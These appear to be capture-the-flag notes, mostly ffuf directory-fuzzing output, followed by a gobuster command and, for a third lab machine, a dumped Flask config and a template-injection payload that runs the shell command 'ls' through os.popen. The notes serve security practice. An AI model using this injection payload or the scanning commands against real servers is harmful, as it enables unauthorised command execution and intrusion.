Duration: [0:00:38] :::: Progress: [5490/9228] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:38] :::: Progress: [5501/9228] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:38] :::: Progress: [5510/9228] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:38] :::: Progress: [5521/9228] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:38] :::: Progress: [5532/9228] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:38] :::: Progress: [5540/9228] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:38] :::: Progress: [5553/9228] :: Job [1/1] :: 42 req/sec :: Duration: [0:00:39] :::: Progress: [5564/9228] :: Job [1/1] :: 42 req/sec :: Duration: [0:00:39] :::: Progress: [5577/9228] :: Job [1/1] :: 42 req/sec :: Duration: [0:00:39] :::: Progress: [5590/9228] :: Job [1/1] :: 42 req/sec :: Duration: [0:00:39] :::: Progress: [5601/9228] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:39] :::: Progress: [5614/9228] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:39] :::: Progress: [5624/9228] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:39] :::: Progress: [5638/9228] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:39] :::: Progress: [5648/9228] :: Job [1/1] :: 84 req/sec :: Duration: [0:00:40] :::: Progress: [5663/9228] :: Job [1/1] :: 88 req/sec :: Duration: [0:00:40] :::: Progress: [5674/9228] :: Job [1/1] :: 90 req/sec :: Duration: [0:00:40] :::: Progress: [5691/9228] :: Job [1/1] :: 94 req/sec :: Duration: [0:00:40] :::: Progress: [5701/9228] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:40] :::: Progress: [5718/9228] :: Job [1/1] :: 98 req/sec :: Duration: [0:00:40] :::: Progress: [5734/9228] :: Job [1/1] :: 101 req/sec :: Duration: [0:00:40] ::: Progress: [5752/9228] :: Job [1/1] :: 106 req/sec :: Duration: [0:00:40] ::: Progress: [5772/9228] :: Job [1/1] :: 110 req/sec :: Duration: [0:00:41] ::: Progress: [5789/9228] :: Job [1/1] :: 113 req/sec :: Duration: [0:00:41] ::: Progress: [5809/9228] :: Job [1/1] :: 120 req/sec :: Duration: [0:00:41] ::: Progress: [5829/9228] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:41] ::: Progress: [5849/9228] :: Job [1/1] :: 134 req/sec :: Duration: [0:00:41] ::: Progress: [5868/9228] :: Job [1/1] :: 138 req/sec :: Duration: [0:00:41] ::: Progress: [5891/9228] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:41] ::: Progress: [5912/9228] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:41] ::: Progress: [5934/9228] :: Job [1/1] :: 159 req/sec :: Duration: [0:00:42] ::: Progress: [5958/9228] :: Job [1/1] :: 165 req/sec :: Duration: [0:00:42] ::: Progress: [5985/9228] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:42] ::: Progress: [6014/9228] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:42] ::: Progress: [6046/9228] :: Job [1/1] :: 197 req/sec :: Duration: [0:00:42] ::: Progress: [6077/9228] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:42] ::: Progress: [6111/9228] :: Job [1/1] :: 228 req/sec :: Duration: [0:00:42] ::: Progress: [6146/9228] :: Job [1/1] :: 248 req/sec :: Duration: [0:00:42] ::: Progress: [6182/9228] :: Job [1/1] :: 263 req/sec :: Duration: [0:00:43] ::: Progress: [6220/9228] :: Job [1/1] :: 278 req/sec :: Duration: [0:00:43] ::: Progress: [6259/9228] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:43] ::: Progress: [6301/9228] :: Job [1/1] :: 303 req/sec :: Duration: [0:00:43] ::: Progress: [6342/9228] :: Job [1/1] :: 317 req/sec :: Duration: [0:00:43] ::: Progress: [6344/9228] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:43] :[Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 80ms]
    * FUZZ: profile

:: Progress: [6389/9228] :: Job [1/1] :: 329 req/sec :: Duration: [0:00:43] ::: Progress: [6432/9228] :: Job [1/1] :: 337 req/sec :: Duration: [0:00:43] ::: Progress: [6478/9228] :: Job [1/1] :: 350 req/sec :: Duration: [0:00:43] ::: Progress: [6526/9228] :: Job [1/1] :: 361 req/sec :: Duration: [0:00:44] ::: Progress: [6570/9228] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:44] ::: Progress: [6614/9228] :: Job [1/1] :: 359 req/sec :: Duration: [0:00:44] ::: Progress: [6658/9228] :: Job [1/1] :: 368 req/sec :: Duration: [0:00:44] ::: Progress: [6707/9228] :: Job [1/1] :: 370 req/sec :: Duration: [0:00:44] ::: Progress: [6751/9228] :: Job [1/1] :: 365 req/sec :: Duration: [0:00:44] ::: Progress: [6796/9228] :: Job [1/1] :: 366 req/sec :: Duration: [0:00:44] ::: Progress: [6843/9228] :: Job [1/1] :: 366 req/sec :: Duration: [0:00:44] ::: Progress: [6888/9228] :: Job [1/1] :: 364 req/sec :: Duration: [0:00:45] ::: Progress: [6933/9228] :: Job [1/1] :: 362 req/sec :: Duration: [0:00:45] ::: Progress: [6977/9228] :: Job [1/1] :: 361 req/sec :: Duration: [0:00:45] ::: Progress: [7020/9228] :: Job [1/1] :: 358 req/sec :: Duration: [0:00:45] ::: Progress: [7064/9228] :: Job [1/1] :: 353 req/sec :: Duration: [0:00:45] ::: Progress: [7103/9228] :: Job [1/1] :: 352 req/sec :: Duration: [0:00:45] ::: Progress: [7148/9228] :: Job [1/1] :: 346 req/sec :: Duration: [0:00:45] ::: Progress: [7189/9228] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:45] ::: Progress: [7204/9228] :: Job [1/1] :: 337 req/sec :: Duration: [0:00:46] :[Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 89ms]
    * FUZZ: server-status

:: Progress: [7231/9228] :: Job [1/1] :: 335 req/sec :: Duration: [0:00:46] ::: Progress: [7274/9228] :: Job [1/1] :: 340 req/sec :: Duration: [0:00:46] ::: Progress: [7315/9228] :: Job [1/1] :: 333 req/sec :: Duration: [0:00:46] ::: Progress: [7354/9228] :: Job [1/1] :: 330 req/sec :: Duration: [0:00:46] :[Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 82ms]
    * FUZZ: signup

:: Progress: [7380/9228] :: Job [1/1] :: 329 req/sec :: Duration: [0:00:46] ::: Progress: [7395/9228] :: Job [1/1] :: 334 req/sec :: Duration: [0:00:46] ::: Progress: [7437/9228] :: Job [1/1] :: 328 req/sec :: Duration: [0:00:46] ::: Progress: [7475/9228] :: Job [1/1] :: 329 req/sec :: Duration: [0:00:46] ::: Progress: [7522/9228] :: Job [1/1] :: 328 req/sec :: Duration: [0:00:46] ::: Progress: [7567/9228] :: Job [1/1] :: 344 req/sec :: Duration: [0:00:47] ::: Progress: [7612/9228] :: Job [1/1] :: 352 req/sec :: Duration: [0:00:47] ::: Progress: [7662/9228] :: Job [1/1] :: 370 req/sec :: Duration: [0:00:47] ::: Progress: [7706/9228] :: Job [1/1] :: 373 req/sec :: Duration: [0:00:47] ::: Progress: [7757/9228] :: Job [1/1] :: 380 req/sec :: Duration: [0:00:47] ::: Progress: [7800/9228] :: Job [1/1] :: 371 req/sec :: Duration: [0:00:47] ::: Progress: [7846/9228] :: Job [1/1] :: 377 req/sec :: Duration: [0:00:47] ::: Progress: [7889/9228] :: Job [1/1] :: 363 req/sec :: Duration: [0:00:47] ::: Progress: [7936/9228] :: Job [1/1] :: 362 req/sec :: Duration: [0:00:48] ::: Progress: [7983/9228] :: Job [1/1] :: 362 req/sec :: Duration: [0:00:48] ::: Progress: [8027/9228] :: Job [1/1] :: 366 req/sec :: Duration: [0:00:48] ::: Progress: [8073/9228] :: Job [1/1] :: 363 req/sec :: Duration: [0:00:48] ::: Progress: [8118/9228] :: Job [1/1] :: 368 req/sec :: Duration: [0:00:48] ::: Progress: [8159/9228] :: Job [1/1] :: 359 req/sec :: Duration: [0:00:48] ::: Progress: [8207/9228] :: Job [1/1] :: 361 req/sec :: Duration: [0:00:48] ::: Progress: [8247/9228] :: Job [1/1] :: 352 req/sec :: Duration: [0:00:48] ::: Progress: [8288/9228] :: Job [1/1] :: 347 req/sec :: Duration: [0:00:49] ::: Progress: [8332/9228] :: Job [1/1] :: 350 req/sec :: Duration: [0:00:49] ::: Progress: [8372/9228] :: Job [1/1] :: 339 req/sec :: Duration: [0:00:49] ::: Progress: [8415/9228] :: Job [1/1] :: 336 req/sec :: Duration: [0:00:49] ::: Progress: [8453/9228] :: Job [1/1] :: 333 req/sec :: Duration: [0:00:49] ::: Progress: [8494/9228] :: Job [1/1] :: 326 req/sec :: Duration: [0:00:49] ::: Progress: [8529/9228] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:49] ::: Progress: [8569/9228] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:49] ::: Progress: [8604/9228] :: Job [1/1] :: 307 req/sec :: Duration: [0:00:50] ::: Progress: [8640/9228] :: Job [1/1] :: 300 req/sec :: Duration: [0:00:50] ::: Progress: [8680/9228] :: Job [1/1] :: 305 req/sec :: Duration: [0:00:50] ::: Progress: [8712/9228] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:50] ::: Progress: [8748/9228] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:50] ::: Progress: [8777/9228] :: Job [1/1] :: 280 req/sec :: Duration: [0:00:50] ::: Progress: [8806/9228] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:50] ::: Progress: [8835/9228] :: Job [1/1] :: 258 req/sec :: Duration: [0:00:50] ::: Progress: [8859/9228] :: Job [1/1] :: 247 req/sec :: Duration: [0:00:51] ::: Progress: [8887/9228] :: Job [1/1] :: 239 req/sec :: Duration: [0:00:51] ::: Progress: [8902/9228] :: Job [1/1] :: 218 req/sec :: Duration: [0:00:51] ::: Progress: [8923/9228] :: Job [1/1] :: 207 req/sec :: Duration: [0:00:51] ::: Progress: [8938/9228] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:51] ::: Progress: [8956/9228] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:51] ::: Progress: [8970/9228] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:51] ::: Progress: [8989/9228] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:51] ::: Progress: [9006/9228] :: Job [1/1] :: 159 req/sec :: Duration: [0:00:52] ::: Progress: [9022/9228] :: Job [1/1] :: 153 req/sec :: Duration: [0:00:52] ::: Progress: [9038/9228] :: Job [1/1] :: 148 req/sec :: Duration: [0:00:52] ::: Progress: [9052/9228] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:52] ::: Progress: [9068/9228] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:52] ::: Progress: [9082/9228] :: Job [1/1] :: 133 req/sec :: Duration: [0:00:52] ::: Progress: [9099/9228] :: Job [1/1] :: 129 req/sec :: Duration: [0:00:52] ::: Progress: [9114/9228] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:52] ::: Progress: [9129/9228] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:53] ::: Progress: [9143/9228] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:53] ::: Progress: [9160/9228] :: Job [1/1] :: 126 req/sec :: Duration: [0:00:53] ::: Progress: [9173/9228] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:53] ::: Progress: [9189/9228] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:53] ::: Progress: [9202/9228] :: Job [1/1] :: 121 req/sec :: Duration: [0:00:53] ::: Progress: [9219/9228] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:53] ::: Progress: [9228/9228] :: Job [1/1] :: 120 req/sec :: Duration: [0:00:53] ::: Progress: [9228/9228] :: Job [1/1] :: 10 req/sec :: Duration: [0:01:11] :: Errors: 3 ::

Finished ffuf scan
                                                                             
=========================
                                                                             
                                                                             
                                                                             
---------------------Finished all scans------------------------              
                                                                             

Completed in 16 minute(s) and 11 second(s)

```


### machine 2

http://34.125.126.47:5001/

gobuster dir --url http://34.125.126.47:5001 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k

### machine 3

http://34.125.126.47:5003/

```
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```

FLAG
__pycache__
app.py
requirements.txt

config.__class__.__init__.__globals__['os'].popen('ls').read()

flag{wik1_g0t_inf3cted}